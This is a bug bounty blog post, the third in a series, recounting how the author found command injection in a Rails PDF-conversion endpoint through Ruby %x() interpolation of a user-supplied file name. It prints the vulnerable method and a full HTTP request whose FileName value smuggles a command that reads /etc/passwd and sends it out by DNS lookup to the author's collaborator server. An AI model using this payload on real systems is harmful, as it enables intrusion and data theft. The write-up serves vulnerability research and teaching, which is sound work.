---
title: 'Basic recon to RCE III'
date: 2022-10-18
description: 'Exploiting command injection through Ruby string interpolation in a Rails application to achieve RCE via DNS exfiltration.'
tags: ['bugbounty', 'rce', 'ruby']
image: '/images/blog/2022/basic-recon-to-rce-iii.png'
---

For the 3rd and I think last episode of the series, we're going to continue with the same target as the episode 2, that I recommend you to go and see at first to put you a bit more in the context : [Basic recon to RCE II](/blog/2022/basic-recon-to-rce-ii/)

## The Story

So, after this first RCE discovered on the application, I wanted to continue to dig, especially because this debug mode displays a POST method on the endpoint `/convertdoctopdf`. So I immediately thought about a SSRF and as it's a bug that I like quite a lot, I wanted to dig it.

Another advantage of the debug mode (on Rails and maybe with other frameworks) is that if the application raises an exception, it will show you the part of the source code concerned in the response, which is pretty handy when you don't know which parameter you should use !

After a first POST request without body, the application displays an error 500 with the piece of code that concerns the error, which tells us that the `SessionId` parameter is missing. I spare you the details but this technique allowed me to obtain the complete code of the method :

```ruby
def convertdoctopdf
  header = {'Content-Type' =>'application/json','Authorization' => 'OAuth '+params['SessionId']}
  id = params['AttachmentId']
  baseURL = params['Url']
  fileName = params['FileName'] ? params['FileName']+(Time.now.to_i).to_s : 'fileconvert'+(Time.now.to_i).to_s
  uri = URI.parse(baseURL+"/services/data/v44.0/sobjects/Attachment/"+id+"/Body")

  https = Net::HTTP.new(uri.host,uri.port)
  https.use_ssl = true
  req = Net::HTTP::Get.new(uri.path, header)
  attachment = https.request(req)

  File.open("#{Rails.root}/public/#{fileName+'.docx'}", 'wb') { |f| f.write(attachment.body) }
  %x(/usr/bin/soffice --headless --convert-to pdf --outdir  "#{Rails.root}/public/file_conversion/" "#{Rails.root}/public/#{fileName+'.docx'}")

  outputfileBase64 = Base64.encode64(open("#{Rails.root}/public/file_conversion/#{fileName}.pdf").to_a.join);

  File.delete("#{Rails.root}/public/file_conversion/#{fileName+'.pdf'}") if File.exist?("#{Rails.root}/public/file_conversion/#{fileName+'.pdf'}")
  File.delete("#{Rails.root}/public/#{fileName+'.docx'}") if File.exist?("#{Rails.root}/public/#{fileName+'.docx'}")

  render json: {file: outputfileBase64}, status: :created, location: "Done"
end
```

Which can be described as follows:

  * `header` = Expects the SessionID parameter but is not important here, you can put anything
  * `id` = Waits for the AttachmentId parameter but is not important either, you can put anything too
  * `baseUrl` = Waits for the url parameter, just enter a valid URL
  * `fileName` = There is a ternary condition that makes it an optional parameter
  * Then a GET request is made, the content is saved to a file, converted to PDF and displayed to the user in base64

I had first stopped after leaking the HTTP request line thinking that was all I needed to trigger my SSRF. Except:

  * A GET request is made on the `URL + path /services/data/v44.0/sobjects/Attachment/"+id+"/Body"` but that can be easily bypassed by specifying a URL of type `https://domain.tld/?x=`, the path will then be forced as the parameter value.
    * The URL will become: `https://domain.tld/?x=/services/data/v44.0/sobjects/Attachment/"+id+"/Body"`
  * `https.use_ssl` = true which is the blocking point because it forces the use of HTTPS

Going back to our source code, I was saying that the body of the response is saved in a file (with the extension docx but in fact it doesn't matter, it's not a real docx but rather a simple text file) and then the soffice binary is called and converts this file into a PDF and displays the content of the PDF in base64 in the response. Something I didn't know yet because I was too focused on the SSRF and I could see in the return of my request in the answer and I didn't try to understand the cause.

I spent a few hours on the SSRF without being able to exploit it because :

  * The use of HTTPS prevents me from typing on internal URLs such as http://127.0.0.1
  * The target must have a valid certificate
  * For some reason I couldn't query a target using a let's encrypt certificate...

Anyway, after these blocking points, to try to inject some code in my PDF I used a Github repository on which I uploaded my PoC then I used the RAW URL (like `https://raw.githubusercontent.com/user/poc/master/poc.html`) to inject the content in the PDF. Unfortunately after many tries, the only tag that seemed to be interpreted was the `<title>` tag, the others were either deleted or not interpreted.

A little disappointed at the time, I gave up because I had other things to do.
That same day I spent the evening with my hunter friend Serizao, and I obviously told him my SSRF problem, we continued to dig together and to have a better overview, we recovered the complete code of the method above.

At this moment, a line directly appealed to us.

```ruby
%x(/usr/bin/soffice --headless --convert-to pdf --outdir  "#{Rails.root}/public/file_conversion/" "#{Rails.root}/public/#{fileName+'.docx'}")
```

The use of `%x()` is an alternative to the use of backticks which allows you to make a system call and display the output. Like backticks, `%x()` also allows string interpolation.

I explained above, that the FileName parameter is optional :
```ruby
fileName = params['FileName'] ? params['FileName']+(Time.now.to_i).to_s : 'fileconvert'+(Time.now.to_i).to_s
```

Because if it is not present, it is set with a default value automatically, but if it is present, it is equivalent to the user input (and this is where the vulnerability lies). The problem is that the string interpolation allows to inject an arbitrary command to execute an additional command to the soffice binary call.

Example to illustrate my point, inside `irb` :
```ruby
2.7.1 :001 > filename = '`id`'+Time.now.to_i.to_s
2.7.1 :002 > %x("#{filename}")
sh: uid=635388061(jomar) [...]1646581930: command not found
 => ""
2.7.1 :003 >
```

So we can see that the id command is executed.
With the following request, it is possible to escape the call to soffice and execute an arbitrary command, to show the vulnerability, I extracted the first characters of the `/etc/passwd` file :
```
POST /convertdoctopdf HTTP/1.1
Host: sub.target.tld
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 214
Content-Type: application/json;charset=UTF-8

{
  "SessionId":"1",
  "AttachmentId":"1",
  "FileName": "\" && getent hosts $(`echo aGVhZCAtYyA0IC9ldGMvcGFzc3dkCg== | base64 -d`).9blrzz2yqaikw8t47xdlfgsa91fr3g.private.collaborator.tld #\"",
  "Url":"https://www.google.com"
}
```

_Side note_ : a domain name can be 255 characters long but a subdomain is limited to 63 characters, think about it if you do a DNS extraction

Explanation of
```bash
"\" && getent hosts $(`echo aGVhZCAtYyA0IC9ldGMvcGFzc3dkCg== | base64 -d`).9blrzz2yqaikw8t47xdlfgsa91fr3g.private.collaborator.tld #\"
```

  * `\"` : Allows to close the parameter pass to soffice binary for the file name
  * `&&` : Indicates that a second command is being processed
  * `getent hosts` : Not having `curl`, `dig`, `ping` etc... available in the environment I used `getent hosts` to execute a DNS query
  * `$(echo aGVhZCAtYyA0IC9ldGMvcGFzc3dkCg== | base64 -d)` : To avoid encoding problems because of the `/` which raises an error with the File.open so, we put our command in base64
    * `echo aGVhZCAtYyA0IC9ldGMvcGFzc3dkCg== | base64 -d => head -c 4 /etc/passwd`. The first 4 characters of the `/etc/passwd` file which correspond to root
      * `9blrzz2yqaikw8t47xdlfgsa91fr3g.private.collaborator.tld` : My private burp collaborator server
      * `#\"` : Allows you to comment out the end of the line and the `"` to avoid a syntax error in the command

In the end, the executed command will be :
```bash
/usr/bin/soffice --headless --convert-to pdf --outdir "folder/public/file_conversion/" "folder/public/" && getent hosts $(`echo aGVhZCAtYyA0IC9ldGMvcGFzc3dkCg== | base64 -d`).9blrzz2yqaikw8t47xdlfgsa91fr3g.private.collaborator.tld #\".pdf").to_a.join);
```

![RCE_PoC](./RCE_POC.png)

## Conclusion

A bug that I found super interesting and was also present for a long time. I know because I had already identified this method more than 6 months ago but I had not taken the time to dig.

What made the difference today is something that is very well explained here: [Corben Leo - Hacking CAN be easy](https://twitter.com/hacker_/status/1509147518638116866). I've been developing small web / api applications on my own time for several months now and I use Ruby on Rails, in addition to giving me a good knowledge of the framework, it also gives me a better vision of a developer and sometimes I do sh*t because I want to go fast or because it annoys me and if I make these mistakes, why shouldn't others do it too ?

But also probably because rather than going from domain to domain looking for the ugly stuff that looks vulnerable, I thought I really wanted to exploit this thing and so I spent some time on it. Which shows once again that sometimes it's much more interesting to focus on an application and understand it than to try to find a magic domain and spread payloads around without understanding what you're doing
